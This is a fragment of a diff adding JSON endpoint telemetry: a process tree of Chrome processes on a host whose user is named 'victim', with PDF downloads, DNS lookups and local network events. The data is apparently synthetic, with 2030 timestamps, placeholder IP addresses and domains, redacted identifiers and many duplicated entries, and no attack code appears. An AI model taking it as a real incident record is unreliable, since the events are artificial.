+                                    "Context (at 2030-01-25 08:23:20.218000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\5a3b5a3ba29d2cd6a68e8c4e48c12ce9352ca7f6\\\\e7499b0f-0a08-47f1-b156-2013f6deeda4\\\\index-dir<br/>",
+                                    "Context (at 2030-01-25 08:23:20.218000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\5a3b5a3ba29d2cd6a68e8c4e48c12ce9352ca7f6\\\\e7499b0f-0a08-47f1-b156-2013f6deeda4<br/>",
+                                    "Context (at 2030-01-25 08:22:51.542000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\587f41eb-7521-4015-ad34-7ae0203b2534.tmp<br/>File size: 79202 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:22:51.355000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\mandate_9180-9180-01.pdf<br/>File size: 79202 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:11:59.857000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\c6f46391-e244-40b6-8f38-c0dc98c314f2.tmp<br/>File size: 1642827 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:11:53.760000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\OCX-bcom DAU 70712273.pdf<br/>File size: 1642827 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:11:41.614000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP4</span>:<br/>224.0.0.251:5353 -> 192.168.1.197:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:11:41.614000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP6</span>:<br/>ff02:0:0:0:0:0:0:fb:5353 -> fe80:0:0:0:180b:8a2d:97fa:145:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:10:10.159000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP4</span>:<br/>224.0.0.251:5353 -> 192.168.1.30:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:08:27.471000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP4</span>:<br/>224.0.0.251:5353 -> 192.168.1.244:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:06:01.396000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP4</span>:<br/>224.0.0.251:5353 -> 192.168.1.29:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:06:01.396000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP6</span>:<br/>ff02:0:0:0:0:0:0:fb:5353 -> fe80:0:0:0:b1ff:361:fc7a:c0ab:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:05:35.965000)   <span style=\"color:#fd8d3c\">WebScriptFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\c9ca6dd0f44fbd1c_0<br/>File size: 26752 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:05:10.497000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>192.168.1.243:5353 -> 224.0.0.251:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:05:10.497000)   <span style=\"color:#fd8d3c\">NetworkConnectIP6</span>:<br/>fe80:0:0:0:45dc:34e1:827d:493b:5353 -> ff02:0:0:0:0:0:0:fb:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:05:10.217000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\blob_storage\\\\d991699d-e0aa-44c3-81e6-c9f5dd20bc9f<br/>",
+                                    "Context (at 2030-01-25 08:05:07.241000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>192.168.1.243:52785 -> 239.255.255.250:1900 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:05:06.717000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationGuidePredictionModels<br/>",
+                                    "Context (at 2030-01-25 08:05:06.913000)   <span style=\"color:#fd8d3c\">ServiceStarted</span>:<br/>Service name: 'GoogleChromeElevationService', Image file name: C:\\Program Files\\Google\\Chrome\\Application\\117.0.5938.150\\elevation_service.exe<br/>",
+                                    "Context (at 2030-01-25 08:05:06.464000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\BrowserMetrics<br/>"
+                                ],
+                                "children": [{
+                                        "name": "chrome.exe",
+                                        "id": "99711995091",
+                                        "details": "Process (ID:99711995091) (since 2030-01-25 08:57:39.832000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --disable-nacl --origin-trial-disabled-features=WebGPU --lang=fr --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=170 --time-ticks-at-unix-epoch=-1697007861996834 --launch-time-ticks=3197826790 --mojo-platform-channel-handle=9940 --field-trial-handle=1744,i,15148319129683906396,6501705682473700619,262144 /prefetch:1<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:57:43.682000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356829",
+                                        "details": "Process (ID:356829) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356828",
+                                        "details": "Process (ID:356828) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356827",
+                                        "details": "Process (ID:356827) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356826",
+                                        "details": "Process (ID:356826) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356825",
+                                        "details": "Process (ID:356825) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356824",
+                                        "details": "Process (ID:356824) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356823",
+                                        "details": "Process (ID:356823) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356822",
+                                        "details": "Process (ID:356822) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356821",
+                                        "details": "Process (ID:356821) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356820",
+                                        "details": "Process (ID:356820) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356819",
+                                        "details": "Process (ID:356819) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356818",
+                                        "details": "Process (ID:356818) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356817",
+                                        "details": "Process (ID:356817) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356816",
+                                        "details": "Process (ID:356816) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356815",
+                                        "details": "Process (ID:356815) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356814",
+                                        "details": "Process (ID:356814) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356813",
